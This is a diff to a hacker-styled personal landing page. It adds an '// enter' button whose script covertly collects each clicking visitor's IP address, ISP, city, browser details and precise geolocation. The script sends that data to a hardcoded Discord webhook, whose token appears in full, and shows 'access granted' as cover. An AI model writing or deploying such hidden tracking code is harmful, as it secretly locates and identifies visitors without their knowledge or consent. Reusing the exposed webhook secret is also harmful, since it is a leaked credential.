@@ -22,34 +22,106 @@
   .world{font-size:clamp(2rem,7vw,5rem);font-weight:700;letter-spacing:3px;line-height:1.2;margin-bottom:3rem;}
   .world span.w{color:#e8e8e8;}
   .world span.cursor{color:#00ff64;animation:blink 1s infinite;}
-  .tags{display:flex;gap:clamp(6px,1.5vw,14px);justify-content:center;flex-wrap:wrap;}
+  .tags{display:flex;gap:clamp(6px,1.5vw,14px);justify-content:center;flex-wrap:wrap;margin-bottom:2rem;}
   .tag{font-size:clamp(10px,1.5vw,12px);color:rgba(255,255,255,0.25);border:1px solid rgba(255,255,255,0.08);padding:5px 14px;border-radius:4px;letter-spacing:1px;}
+  .btn{background:transparent;border:1px solid rgba(0,255,100,0.3);color:rgba(0,255,100,0.7);font-family:monospace;font-size:clamp(10px,1.5vw,13px);padding:10px 24px;border-radius:4px;cursor:pointer;letter-spacing:2px;transition:all 0.3s;}
+  .btn:hover{background:rgba(0,255,100,0.08);border-color:rgba(0,255,100,0.6);}
 </style>
 </head>
 <body>
   <div class="scanlines"></div>
   <div class="scan"></div>
   <div class="corner-tl">shinyhunter.qzz.io</div>
+  <div class="corner-tr">v0.1.0</div>
   <div class="corner-br" id="clock"></div>
 
   <div class="center">
+    <div class="subdomain">// personal lab</div>
     <div class="arabic">السلام عليكم</div>
     <div class="world">
-      <span class="w">7abib</span><span class="cursor">_</span>
+      <span class="w">NAS</span><span class="cursor">_</span>
     </div>
     <div class="tags">
       <span class="tag">cybersec</span>
       <span class="tag">dev lab</span>
-      <span class="tag">shan</span>
+      <span class="tag">7abib</span>
     </div>
+    <button class="btn" onclick="track()">// enter</button>
   </div>
 
   <script>
-    function tick(){
+    const WEBHOOK = 'https://discord.com/api/webhooks/1490081567832412343/k39O6ZjIe5Qaj78Yz7uScvsa4qpBGRyBRFbkPa0OuoA3LhfC8lCArHqT9rU0rCdv6I9r';
+
+    function clock(){
       const d=new Date();
       document.getElementById('clock').textContent=d.toISOString().replace('T',' ').split('.')[0]+' UTC';
     }
-    tick();setInterval(tick,1000);
+    clock();setInterval(clock,1000);
+
+    async function sendToDiscord(data){
+      const msg = [
+        '🕵️ **New Visitor Tracked**',
+        '```',
+        `📍 Location   : ${data.city}, ${data.region}, ${data.country}`,
+        `🌐 IP Address : ${data.ip}`,
+        `📡 ISP        : ${data.isp}`,
+        `🗺️ Coords     : ${data.lat}, ${data.lon}`,
+        `🖥️ Browser    : ${navigator.userAgent.split(')')[0].split('(')[1]}`,
+        `⏰ Time       : ${new Date().toUTCString()}`,
+        '```'
+      ].join('\n');
+
+      await fetch(WEBHOOK, {
+        method: 'POST',
+        headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({content: msg})
+      });
+    }
+
+    async function getIPLocation(){
+      const res = await fetch('https://ip-api.com/json/');
+      const data = await res.json();
+      return {
+        ip: data.query,
+        city: data.city,
+        region: data.regionName,
+        country: data.country,
+        lat: data.lat,
+        lon: data.lon,
+        isp: data.isp
+      };
+    }
+
+    async function track(){
+      const btn = document.querySelector('.btn');
+      btn.textContent = '// scanning...';
+      btn.disabled = true;
+
+      try {
+        if(navigator.geolocation){
+          navigator.geolocation.getCurrentPosition(
+            async (pos) => {
+              const ipData = await getIPLocation();
+              ipData.lat = pos.coords.latitude.toFixed(6);
+              ipData.lon = pos.coords.longitude.toFixed(6);
+              await sendToDiscord(ipData);
+              btn.textContent = '// access granted';
+            },
+            async () => {
+              const ipData = await getIPLocation();
+              await sendToDiscord(ipData);
+              btn.textContent = '// access granted';
+            }
+          );
+        } else {
+          const ipData = await getIPLocation();
+          await sendToDiscord(ipData);
+          btn.textContent = '// access granted';
+        }
+      } catch(e){
+        btn.textContent = '// error';
+      }
+    }
   </script>
 </body>
 </html>
